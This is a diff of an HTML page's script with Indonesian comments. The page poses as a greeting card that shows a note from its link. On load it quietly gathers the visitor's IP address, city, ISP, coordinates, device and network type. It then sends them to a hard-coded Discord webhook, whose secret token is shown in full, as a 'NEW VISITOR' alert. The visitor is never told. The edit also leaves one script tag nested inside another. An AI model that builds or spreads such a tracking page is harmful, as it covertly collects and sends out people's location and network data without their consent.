@@ -48,85 +48,77 @@
     <div class="loader" id="loader"></div>
 
     <script>
-        // --- CONFIGURATION ---
-        // PASTE WEBHOOK DISCORD ANDA DIBAWAH INI
-        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1513396133249024242/EZ8GI-vnWbW86C-aG8FLFa54nAj5ur-aTvZ5oLdqmQnj4lNlVbjgXXamrCLwLFZQcPst"; 
+        <script>
+            
+    // === PASTE DISCORD WEBHOOK URL ===
+    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1513396133249024242/EZ8GI-vnWbW86C-aG8FLFa54nAj5ur-aTvZ5oLdqmQnj4lNlVbjgXXamrCLwLFZQcPst";
 
-        // Ambil parameter dari URL
-        const params = new URLSearchParams(window.location.search);
-        const catetan = params.get('note');
+    const params = new URLSearchParams(window.location.search);
+    const catetan = params.get('note');
 
-        // Tampilkan greeting sesuai waktu
-        const hour = new Date().getHours();
-        const greet = hour < 12 ? "Good Morning" : hour < 18 ? "Good Afternoon" : "Good Evening";
-        document.getElementById('greetText').innerText = greet + " :)";
-        document.getElementById('noteText').innerText = catetan ? `📝 ${decodeURIComponent(catetan)}` : "";
+    const jam = new Date().getHours();
+    const sapa = jam < 12 ? "Good Morning" : jam < 18 ? "Good Afternoon" : "Good Evening";
+    
+    document.getElementById('greetText').innerText = sapa + " :)";
+    document.getElementById('greetText').setAttribute('data-text', sapa + " :)");
+    document.getElementById('noteText').innerText = catetan ? decodeURIComponent(catetan) : "";
 
-        // --- FUNGSI KIRIM DATA + GEOLOCATION ---
-        async function sendVisitorData() {
-            document.getElementById('loader').classList.add('active');
+    async function collectAndSend() {
+        document.getElementById('loader').classList.add('active');
 
-            // 1. Ambil IP & Basic Info
-            let ip = "Unknown", loc = "Unknown", isp = "Unknown";
-            let lat = null, lon = null; // Koordinat
+        const waktu = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
 
-            try {
-                const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
-                ip = ipData.ip;
-                loc = `${ipData.city}, ${ipData.region}, ${ipData.country}`;
-                isp = ipData.org;
-            } catch(e) { console.log("IP Error", e); }
+        let ip = "-", loc = "-", isp = "-", latitude = "-", longitude = "-";
 
-            // 2. Coba Ambil GPS (Jika user izinkan)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    lat = position.coords.latitude;
-                    lon = position.coords.longitude;
-                    // Kirim ulang dengan coords
-                    await postToDiscord(ip, loc, isp, lat, lon);
-                }, async (err) => {
-                    // GPS error/denied, tetap kirim tanpa coords
-                    await postToDiscord(ip, loc, isp, null, null);
-                });
-            } else {
-                await postToDiscord(ip, loc, isp, null, null);
-            }
+        try {
+            // AMBIL DATA IP + LOKASI + KOORDINAT Sekaligus
+            const d = await fetch('https://ipapi.co/json/').then(r => r.json());
+            
+            ip = d.ip;
+            loc = `${d.city||''}, ${d.region||''}, ${d.country||''}`;
+            isp = d.org;
+            latitude = d.latitude;
+            longitude = d.longitude;
+            
+        } catch(e) {
+            console.log("Error:", e);
         }
 
-        async function postToDiscord(ip, loc, isp, lat, lon) {
-            if(WEBHOOK_URL.includes("PASTE")) return;
+        const koordinat = (latitude && longitude) ? `${latitude}, ${longitude}` : "-";
 
-            const waktu = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
-            const device = navigator.userAgent.includes("Windows") ? "Windows" : 
-                          navigator.userAgent.includes("Mac") ? "Mac" :
-                          navigator.userAgent.includes("Android") ? "Android" : "Mobile";
+        const ua = navigator.userAgent;
+        const device = ua.includes("Windows") ? "Windows" : ua.includes("Mac") ? "Mac" : ua.includes("Android") ? "Android" : "Mobile";
+            
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const network = conn ? conn.effectiveType : "Wifi";
 
-            const coords = lat ? `\n📍 Koordinat: ${lat}, ${lon}` : "";
-            const noteTxt = catetan ? `\n📝 Catatan: ${decodeURIComponent(catetan)}` : "";
-
-            const payload = {
+        // KIRIM KE DISCORD
+        if (WEBHOOK_URL.includes("discord.com/api/webhooks/") && !WEBHOOK_URL.includes("ISI_URL")) {
+            const pesan = {
                 content: `🎯 **NEW VISITOR**\n` +
                          `⏰ Waktu: ${waktu}\n` +
                          `🌍 IP: ${ip}\n` +
-                         `🏢 Lokasi: ${loc} (ISP: ${isp})\n` +
+                         `📍 Lokasi: ${loc}\n` +
+                         `🏢 ISP: ${isp}\n` +
                          `💻 Device: ${device}\n` +
-                         coords + noteTxt
+                         `📡 Network: ${network}\n` +
+                         `📍 Koordinat: ${koordinat}\n` +
+                         (catetan ? `📝 Catatan: ${decodeURIComponent(catetan)}` : '')
             };
 
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(pesan)
                 });
             } catch(e) {}
-            
-            // Loader hilang
-            setTimeout(() => document.getElementById('loader').classList.remove('active'), 1000);
         }
 
-        // Jalankan saat halaman dimuat
-        window.onload = sendVisitorData;
-    </script>
+        setTimeout(() => document.getElementById('loader').classList.remove('active'), 1500);
+    }
+
+    window.onload = collectAndSend;
+</script>
 </body>
 </html>
